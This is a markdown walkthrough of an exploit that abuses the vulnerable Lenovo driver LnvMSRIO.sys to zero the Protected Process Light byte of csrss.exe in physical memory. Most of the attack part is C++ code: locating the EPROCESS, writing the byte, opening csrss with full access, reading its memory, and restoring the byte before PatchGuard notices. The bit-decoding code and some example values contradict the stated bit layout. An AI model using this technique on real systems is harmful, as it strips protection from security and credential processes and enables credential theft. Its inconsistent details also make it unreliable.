# 03 — PPL Bypass (Protected Process Light)

**File:** `03_ppl_bypass.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical memory read + write (1 byte)  
**Target:** `csrss.exe` (always running, always PPL)  
**Output:** `OpenProcess(PROCESS_ALL_ACCESS, csrss)` succeeds; csrss memory is readable

---

## Objective

Demonstrate that the PPL (Protected Process Light) mechanism — used to protect system processes such as csrss, lsass, and antimalware agents — can be completely disabled with a single **1-byte write** to physical memory.

---

## Background Theory

### _PS_PROTECTION (1 byte at EPROCESS+0x87A)

PPL/PP is controlled by **a single byte** in the EPROCESS:

```
bit [2:0] = Type:
    0 = PS_PROTECTED_TYPE_NONE          (no protection)
    1 = PS_PROTECTED_TYPE_PROTECTED_LIGHT  (PPL)
    2 = PS_PROTECTED_TYPE_PROTECTED        (PP — full)

bit [3]   = Audit (usually = 0)

bit [7:4] = Signer:
    0 = None
    1 = Authenticode
    3 = Antimalware    (Windows Defender)
    4 = Lsa
    5 = Windows        (csrss, winlogon)
    6 = WinTcb         (smss, services)
    7 = WinSystem
```

Example: csrss.exe commonly has `Protection = 0x62` = Signer=6 (WinTcb), Type=2 (Protected) on some builds. Or `0x2A` = Signer=5 (Windows), Type=2.

**Zeroing this 1 byte = erasing all protection** for that process.

### How the kernel checks PPL

When user-mode calls `OpenProcess(PROCESS_ALL_ACCESS, csrss_pid)`, the kernel:

1. Retrieves the EPROCESS of the target (csrss)
2. Reads the `_PS_PROTECTION` byte
3. If Type != None: compares the Signer level of the caller and the target
4. If caller level < target level → returns `STATUS_ACCESS_DENIED`

After zeroing the Protection byte: Type = 0 = None → step 3 is skipped → OpenProcess succeeds.

### PatchGuard Risk

PatchGuard checks `_PS_PROTECTION` for certain processes (particularly csrss and other system processes). **If left zeroed for too long, PatchGuard detects the modification → BSOD 0x109 (CRITICAL_STRUCTURE_CORRUPTION)**.

Solution: restore immediately after use (in this code: restore before `main()` returns).

---

## Line-by-Line Code Explanation

### Constants and decode functions

```cpp
#define EPROC_OFF_PID    0x440u
#define EPROC_OFF_FNAME  0x5A8u
#define EPROC_OFF_PROT   0x87Au   // _PS_PROTECTION byte — offset stable across Win10-Win11
```

```cpp
static const char *ProtTypeName(uint8_t byte)
{
    switch (byte & 0x07) {            // take the 3 lowest bits
    case 0: return "None";
    case 1: return "PPL (Light)";
    case 2: return "PP (Protected)";
    default: return "Unknown";
    }
}

static const char *ProtSignerName(uint8_t byte)
{
    switch ((byte >> 3) & 0x0F) {     // take bits [6:3] (4 bits)
    case 5:  return "Windows";        // csrss, winlogon
    case 6:  return "WinTcb";         // smss, services
    ...
    }
}
```

`byte & 0x07`: masks the 3 low bits (Type).  
`(byte >> 3) & 0x0F`: shifts right by 3 then masks 4 bits (Signer).

### GetCsrssPid()

```cpp
static DWORD GetCsrssPid()
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do {
            if (_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}
```

Uses the Toolhelp32 API to enumerate processes and find the PID of csrss.exe. Why csrss?
1. Always running on every Windows system
2. Always has PPL/PP protection
3. It is the best proof-of-concept target — if this bypasses csrss then it bypasses any PPL process

### Proving state BEFORE the patch

```cpp
HANDLE hBefore = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
if (hBefore) {
    // Should not happen — means it was already unprotected or we are running as SYSTEM
    printf("[!] Succeeded — already unprotected or running as SYSTEM\n");
    CloseHandle(hBefore);
    CloseHandle(g_dev);
    return 0;
}
DWORD errBefore = GetLastError();
// Expected: ERROR_ACCESS_DENIED (5)
```

This is the **before** step — proving the system is in its normal protected state.

### FindEprocess (byte write version)

```cpp
static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    ...
    for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {
        ULONG_PTR pid = *(ULONG_PTR *)(chunk + off + EPROC_OFF_PID);
        if ((DWORD)pid != targetPid || pid >> 32) continue;

        const char *fname = (const char *)(chunk + off + EPROC_OFF_FNAME);
        if (_strnicmp(fname, targetName, strlen(targetName)) != 0) continue;

        result = pa + off;  // PA of the EPROCESS base
```

Returns the physical address (PA) of the csrss EPROCESS.

### Zeroing the Protection Byte

```cpp
// Read the original byte first
uint8_t prot_orig = 0xFF;
PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_orig);
PrintProtection("Protection (before):", prot_orig);
// → "0x62 [ Type=PP (Protected)  Signer=WinTcb ]"

// Write 0x00 → erase all protection
PhysWriteU8(eproc_pa + EPROC_OFF_PROT, 0x00);
```

`PhysWriteU8` uses `AccessSize=1, Count=1` → writes exactly 1 byte to that PA.

```cpp
// Readback verify
uint8_t prot_after = 0xFF;
PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_after);
// Expected: 0x00
```

### Proof: OpenProcess AFTER the Patch

```cpp
Sleep(50);  // 50ms delay: kernel may cache the token/protection for in-flight syscalls
            // Sufficient for all pending checks to complete

HANDLE hAfter = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
if (hAfter) {
    printf("SUCCESS handle=%p — PPL is gone!\n", hAfter);

    // Extra proof: read memory from csrss
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    uint8_t remote[16] = {};
    SIZE_T nread = 0;
    BOOL rmOk = ReadProcessMemory(hAfter, hNtdll, remote, sizeof(remote), &nread);
    // hNtdll is a shared mapping — same VA in every process (NTDLL is a DLL)
    // If we can read 16 bytes of ntdll.dll from csrss's process space → bypass confirmed
```

`ntdll.dll` is mapped at the same VA in every process (Windows shared user space). We use it as a known address to test `ReadProcessMemory`.

### RESTORE — Most Critical Step

```cpp
printf("[*] Restoring _PS_PROTECTION (0x%02X)...\n", prot_orig);
if (PhysWriteU8(eproc_pa + EPROC_OFF_PROT, prot_orig)) {
    uint8_t prot_restored = 0xFF;
    PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_restored);
    printf("Protection (restored): 0x%02X\n", prot_restored);
    printf("[+] Restored successfully. BSOD risk eliminated.\n");
} else {
    printf("[-] RESTORE FAILED — machine may BSOD soon (PatchGuard)\n");
    printf("    Save your work and reboot.\n");
}
```

**Why must we restore?**  
PatchGuard has a randomized timer, typically anywhere from 5 seconds to a few minutes. If it scans the EPROCESS of csrss and finds Protection = 0 (when csrss must be PP/PPL), it triggers BSOD 0x109.

**Restoring is safe** because csrss continues running normally with its protection reinstated.

---

## Stability

| Issue | Explanation |
|-------|-------------|
| **PatchGuard** | **Dangerous** — scans the Protection field of system processes. Must restore within a few seconds |
| BSOD if csrss crashes | csrss is a critical process — if it crashes, Windows BSODs automatically. But we only modify the Protection byte; we do not cause csrss to crash |
| Detection | EDR can detect via ObRegisterCallbacks (if not already removed) |
| Timing | Must restore before PatchGuard scans. Safe window ≈ 1–30 seconds |

---

## Flow Summary

```
GetCsrssPid() = 123

OpenProcess(PROCESS_ALL_ACCESS, 123) → ACCESS_DENIED ✓ (before)
    ↓
FindEprocess(123, "csrss") → eproc_pa = 0x...

PhysReadU8(eproc_pa + 0x87A) = 0x62  [PP WinTcb]
    ↓
PhysWriteU8(eproc_pa + 0x87A, 0x00)
    ↓
ReadBack = 0x00 ✓
    ↓
OpenProcess(PROCESS_ALL_ACCESS, 123) → SUCCESS ✓ (after)
ReadProcessMemory(csrss, ntdll_va) → MZ bytes ✓
    ↓
PhysWriteU8(eproc_pa + 0x87A, 0x62)  ← RESTORE
```
